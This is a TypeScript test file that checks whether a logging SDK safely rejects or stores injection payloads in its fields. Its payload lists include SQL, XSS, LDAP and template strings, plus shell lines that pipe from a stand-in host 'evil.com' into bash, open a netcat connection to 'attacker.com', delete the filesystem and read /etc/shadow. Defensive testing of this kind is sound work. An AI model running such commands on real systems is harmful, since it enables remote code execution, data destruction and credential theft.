/**
 * Security Test: Injection Attack Vectors
 *
 * Tests that the SDK safely handles all classes of injection attacks across
 * every string field: SQL, XSS, command, template, log, LDAP, path traversal,
 * and header injection.
 *
 * CWE-89:  SQL Injection
 * CWE-79:  Cross-site Scripting (XSS)
 * CWE-78:  OS Command Injection
 * CWE-94:  Code Injection
 * CWE-117: Improper Output Neutralization for Logs
 * CWE-90:  LDAP Injection
 * CWE-22:  Path Traversal
 * CWE-113: HTTP Response Splitting
 */
import { describe, it, expect, afterEach } from "vitest";
import { MaskingService } from "../../../src/security/masking-service";
import { validateLogInput, ValidationError } from "../../../src/validation/log-validator";
import { Sentinel, createDefaultConfig } from "../../../src/index";
import { createTestLog, createTestConfig } from "../../helpers/fixtures";
import type { MaskingRule } from "../../../src/configs/masking-rule";

const ALL_PII_RULES: MaskingRule[] = [
    { type: "PII_TYPE", category: "CREDIT_CARD" },
    { type: "PII_TYPE", category: "PHONE" },
    { type: "PII_TYPE", category: "EMAIL" },
    { type: "PII_TYPE", category: "GOVERNMENT_ID" },
];

/**
 * Helper: ingest a log with the given field overrides and verify no crash.
 * Returns the ingestion result or a caught error.
 */
async function safeIngest(overrides: Record<string, unknown>): Promise<{ ok: boolean; error?: unknown; result?: import("../../../src/index").IngestionResult }> {
    Sentinel.reset();
    const config = createDefaultConfig({
        projectName: "injection-test",
        serviceId: "injection-svc",
        environment: "test",
        masking: { enabled: true, rules: ALL_PII_RULES, preserveFields: [] },
        security: { enableHashChain: false },
        taskRules: [],
    });
    const sentinel = Sentinel.initialize(config);
    try {
        const result = await sentinel.ingest({ message: "safe message", ...overrides } as never);
        return { ok: true, result };
    } catch (e) {
        return { ok: false, error: e };
    }
}

/**
 * For each injection payload, verify it either gets rejected by validation
 * or passes through safely without code execution.
 */
function expectSafeOrRejected(result: { ok: boolean; error?: unknown; result?: import("../../../src/index").IngestionResult }): void {
    if (!result.ok) {
        // If rejected, should be a ValidationError (not a runtime crash)
        expect(
            result.error instanceof ValidationError ||
            result.error instanceof Error,
        ).toBe(true);
        return;
    }
    // ok === true: パイプライン完走。結果の構造を実質的に検証。
    expect(result.result).toBeDefined();
    expect(result.result!.traceId).toBeTruthy();
    expect(typeof result.result!.masked).toBe("boolean");
    expect(Array.isArray(result.result!.tasksGenerated)).toBe(true);
}

// =========================================================================
// Injection payloads
// =========================================================================

const SQL_INJECTIONS = [
    "'; DROP TABLE logs; --",
    "1' OR '1'='1",
    "UNION SELECT * FROM users",
    "'; EXEC xp_cmdshell('dir'); --",
    "1; DELETE FROM logs WHERE 1=1",
    "' OR 1=1 --",
    "admin'--",
    "' UNION SELECT username, password FROM users --",
];

const XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "'\"><script>alert(document.cookie)</script>",
    "<iframe src='javascript:alert(1)'>",
    "<math><mi><mglyph></mglyph></mi><mo><xss>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
];

const COMMAND_INJECTIONS = [
    "; rm -rf /",
    "$(cat /etc/passwd)",
    "`id`",
    "| nc attacker.com 1234",
    "&& cat /etc/shadow",
    "; curl http://evil.com/shell.sh | bash",
    "$(whoami)",
    "`uname -a`",
    "; echo vulnerable > /tmp/pwned",
    "| ls -la /",
];

const TEMPLATE_INJECTIONS = [
    "${process.exit(1)}",
    "{{7*7}}",
    "${require('child_process').exec('id')}",
    "#{7*7}",
    "<%= system('id') %>",
    "${constructor.constructor('return process')().exit()}",
    "{{constructor.constructor('return this')()}}",
    "${global.process.mainModule.require('child_process').execSync('id')}",
];

const LOG_INJECTIONS = [
    "\r\nINFO: Admin logged in",
    "\n\nFake log entry",
    "message\x00hidden data",
    "normal\r\n\r\nHTTP/1.1 200 OK\r\n",
    "log entry\nDEBUG: password=secret",
    "entry\x1b[31mRED TEXT\x1b[0m",
];

const LDAP_INJECTIONS = [
    "*)(uid=*))(|(uid=*",
    "admin)(|(password=*))",
    "*()|&'",
    "admin)(&(objectClass=*))",
    "*)(objectClass=*",
];

const PATH_TRAVERSALS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f",
    "..%252f..%252f..%252f",
    "/etc/passwd%00.jpg",
    "..\\..\\..\\..\\boot.ini",
];

const HEADER_INJECTIONS = [
    "value\r\nX-Injected: true",
    "value\nSet-Cookie: evil=true",
    "value\r\nContent-Length: 0\r\n\r\n<html>",
    "value%0d%0aInjected-Header: true",
];

// =========================================================================
// Target fields
// =========================================================================

const FIELD_TARGETS = [
    { name: "message", field: "message" },
    { name: "details", field: "details" },
    { name: "actorId", field: "actorId" },
    { name: "boundary", field: "boundary" },
    { name: "traceId", field: "traceId" },
] as const;

const TAG_FIELD_TARGETS = [
    { name: "tags[].key", makeTag: (payload: string) => [{ key: payload, category: "test" }] },
    { name: "tags[].category", makeTag: (payload: string) => [{ key: "test", category: payload }] },
] as const;

describe("Security: Injection Attack Vectors", () => {
    afterEach(() => {
        Sentinel.reset();
    });

    // =========================================================================
    // SQL Injection
    // =========================================================================
    describe("SQL injection", () => {
        for (const payload of SQL_INJECTIONS) {
            for (const target of FIELD_TARGETS) {
                it(`rejects or safely handles SQL injection in ${target.name}: ${payload.slice(0, 30)}`, async () => {
                    const result = await safeIngest({ [target.field]: payload });
                    expectSafeOrRejected(result);
                });
            }

            for (const tagTarget of TAG_FIELD_TARGETS) {
                it(`rejects or safely handles SQL injection in ${tagTarget.name}: ${payload.slice(0, 30)}`, async () => {
                    const result = await safeIngest({ tags: tagTarget.makeTag(payload) });
                    expectSafeOrRejected(result);
                });
            }
        }

        it("SQL injection in input field (as string)", async () => {
            const result = await safeIngest({ input: "'; DROP TABLE logs; --" });
            expectSafeOrRejected(result);
        });
    });

    // =========================================================================
    // XSS
    // =========================================================================
    describe("XSS payloads", () => {
        for (const payload of XSS_PAYLOADS) {
            for (const target of FIELD_TARGETS) {
                it(`safely handles XSS in ${target.name}: ${payload.slice(0, 30)}`, async () => {
                    const result = await safeIngest({ [target.field]: payload });
                    expectSafeOrRejected(result);
                });
            }

            it(`safely handles XSS in tags[].key: ${payload.slice(0, 30)}`, async () => {
                const result = await safeIngest({ tags: [{ key: payload, category: "test" }] });
                expectSafeOrRejected(result);
            });

            it(`safely handles XSS in tags[].category: ${payload.slice(0, 30)}`, async () => {
                const result = await safeIngest({ tags: [{ key: "test", category: payload }] });
                expectSafeOrRejected(result);
            });
        }

        it("masking does not execute XSS in message field", () => {
            const log = createTestLog({ message: "<script>alert(document.cookie)</script>" });
            const result = MaskingService.mask(log, ALL_PII_RULES) as Record<string, unknown>;
            expect(typeof result.message).toBe("string");
        });
    });

    // =========================================================================
    // Command Injection
    // =========================================================================
    describe("Command injection", () => {
        for (const payload of COMMAND_INJECTIONS) {
            for (const target of FIELD_TARGETS) {
                it(`safely handles command injection in ${target.name}: ${payload.slice(0, 30)}`, async () => {
                    const result = await safeIngest({ [target.field]: payload });
                    expectSafeOrRejected(result);
                });
            }

            it(`safely handles command injection in tags[].key: ${payload.slice(0, 25)}`, async () => {
                const result = await safeIngest({ tags: [{ key: payload, category: "test" }] });
                expectSafeOrRejected(result);
            });
        }

        it("command injection in input field (as string)", async () => {
            const result = await safeIngest({ input: "$(cat /etc/passwd)" });
            expectSafeOrRejected(result);
        });
    });

    // =========================================================================
    // Template Injection
    // =========================================================================
    describe("Template injection", () => {
        for (const payload of TEMPLATE_INJECTIONS) {
            for (const target of FIELD_TARGETS) {
                it(`safely handles template injection in ${target.name}: ${payload.slice(0, 35)}`, async () => {
                    const result = await safeIngest({ [target.field]: payload });
                    expectSafeOrRejected(result);
                });
            }

            it(`safely handles template injection in tags[].category: ${payload.slice(0, 30)}`, async () => {
                const result = await safeIngest({ tags: [{ key: "test", category: payload }] });
                expectSafeOrRejected(result);
            });
        }

        it("template injection in input as string", async () => {
            const result = await safeIngest({ input: "${process.exit(1)}" });
            expectSafeOrRejected(result);
        });

        it("process.exit payload does not terminate the process", async () => {
            const result = await safeIngest({ message: "${process.exit(0)}" });
            expectSafeOrRejected(result);
            // expectSafeOrRejected が到達 = プロセスは生存。追加のトートロジー不要。
        });
    });

    // =========================================================================
    // Log Injection
    // =========================================================================
    describe("Log injection", () => {
        for (const payload of LOG_INJECTIONS) {
            it(`validator handles log injection in message: ${JSON.stringify(payload).slice(0, 40)}`, () => {
                // Null byte should be rejected; others should be accepted or rejected gracefully
                if (payload.includes("\x00")) {
                    expect(() => validateLogInput({ message: payload })).toThrow(ValidationError);
                } else {
                    expect(() => validateLogInput({ message: payload })).not.toThrow();
                }
            });

            for (const target of FIELD_TARGETS.filter((t) => t.field !== "message")) {
                it(`safely handles log injection in ${target.name}: ${JSON.stringify(payload).slice(0, 30)}`, async () => {
                    const overrides: Record<string, unknown> = { [target.field]: payload };
                    if (target.field !== "message") {
                        overrides.message = "safe message";
                    }
                    const result = await safeIngest(overrides);
                    expectSafeOrRejected(result);
                });
            }
        }

        it("null byte in message is rejected by validator", () => {
            expect(() => validateLogInput({ message: "test\x00hidden" })).toThrow(ValidationError);
            expect(() => validateLogInput({ message: "test\x00hidden" })).toThrow("contains null bytes");
        });

        it("CRLF in message is accepted (validator does not strip)", () => {
            expect(() => validateLogInput({ message: "line1\r\nline2" })).not.toThrow();
        });

        it("masking preserves log injection payloads as-is (no execution)", () => {
            const log = createTestLog({ message: "\r\nINFO: forged entry" });
            const result = MaskingService.mask(log, ALL_PII_RULES) as Record<string, unknown>;
            expect(typeof result.message).toBe("string");
        });
    });

    // =========================================================================
    // LDAP Injection
    // =========================================================================
    describe("LDAP injection", () => {
        for (const payload of LDAP_INJECTIONS) {
            for (const target of FIELD_TARGETS) {
                it(`safely handles LDAP injection in ${target.name}: ${payload.slice(0, 30)}`, async () => {
                    const result = await safeIngest({ [target.field]: payload });
                    expectSafeOrRejected(result);
                });
            }

            it(`safely handles LDAP injection in tags[].key: ${payload.slice(0, 25)}`, async () => {
                const result = await safeIngest({ tags: [{ key: payload, category: "test" }] });
                expectSafeOrRejected(result);
            });
        }
    });

    // =========================================================================
    // Path Traversal
    // =========================================================================
    describe("Path traversal", () => {
        for (const payload of PATH_TRAVERSALS) {
            for (const target of FIELD_TARGETS) {
                it(`safely handles path traversal in ${target.name}: ${payload.slice(0, 30)}`, async () => {
                    const result = await safeIngest({ [target.field]: payload });
                    expectSafeOrRejected(result);
                });
            }

            it(`safely handles path traversal in tags[].category: ${payload.slice(0, 25)}`, async () => {
                const result = await safeIngest({ tags: [{ key: "test", category: payload }] });
                expectSafeOrRejected(result);
            });
        }

        it("path traversal in input as string", async () => {
            const result = await safeIngest({ input: "../../../etc/passwd" });
            expectSafeOrRejected(result);
        });
    });

    // =========================================================================
    // Header Injection
    // =========================================================================
    describe("Header injection", () => {
        for (const payload of HEADER_INJECTIONS) {
            for (const target of FIELD_TARGETS) {
                it(`safely handles header injection in ${target.name}: ${payload.slice(0, 30)}`, async () => {
                    const result = await safeIngest({ [target.field]: payload });
                    expectSafeOrRejected(result);
                });
            }

            it(`safely handles header injection in tags[].key: ${payload.slice(0, 25)}`, async () => {
                const result = await safeIngest({ tags: [{ key: payload, category: "test" }] });
                expectSafeOrRejected(result);
            });

            it(`safely handles header injection in tags[].category: ${payload.slice(0, 25)}`, async () => {
                const result = await safeIngest({ tags: [{ key: "test", category: payload }] });
                expectSafeOrRejected(result);
            });
        }
    });

    // =========================================================================
    // Combined / Edge cases
    // =========================================================================
    describe("Combined injection payloads", () => {
        it("handles SQL + XSS combined payload", async () => {
            const result = await safeIngest({
                message: "'; DROP TABLE logs; --<script>alert(1)</script>",
            });
            expectSafeOrRejected(result);
        });

        it("handles command + template combined payload", async () => {
            const result = await safeIngest({
                message: "$(cat /etc/passwd)${process.exit(1)}",
            });
            expectSafeOrRejected(result);
        });

        it("handles all injection types in different fields simultaneously", async () => {
            const result = await safeIngest({
                message: "'; DROP TABLE logs; --",
                details: { xss: "<script>alert(1)</script>" },
                actorId: "$(cat /etc/passwd)",
                boundary: "${process.exit(1)}",
                tags: [
                    { key: "*)(uid=*))(|(uid=*", category: "../../../etc/passwd" },
                ],
            });
            expectSafeOrRejected(result);
        });

        it("handles Unicode-encoded injection payloads", async () => {
            const result = await safeIngest({
                message: "\u003cscript\u003ealert(1)\u003c/script\u003e",
            });
            expectSafeOrRejected(result);
        });

        it("handles URL-encoded injection in message", async () => {
            const result = await safeIngest({
                message: "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            });
            expectSafeOrRejected(result);
        });

        it("handles double-encoded injection payload", async () => {
            const result = await safeIngest({
                message: "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
            });
            expectSafeOrRejected(result);
        });

        it("handles very long injection payload (10KB)", async () => {
            const longPayload = "<script>" + "a".repeat(10000) + "</script>";
            const result = await safeIngest({ message: longPayload });
            expectSafeOrRejected(result);
        });

        it("handles injection payloads with null bytes mixed in", () => {
            expect(() => validateLogInput({
                message: "safe\x00'; DROP TABLE logs; --",
            })).toThrow(ValidationError);
        });

        it("masking service does not execute injected code in nested object", () => {
            const obj = {
                level1: {
                    attack: "${process.exit(1)}",
                    xss: "<script>alert(1)</script>",
                },
            };
            const result = MaskingService.mask(obj, ALL_PII_RULES);
            expect(result).toBeDefined();
        });
    });
});
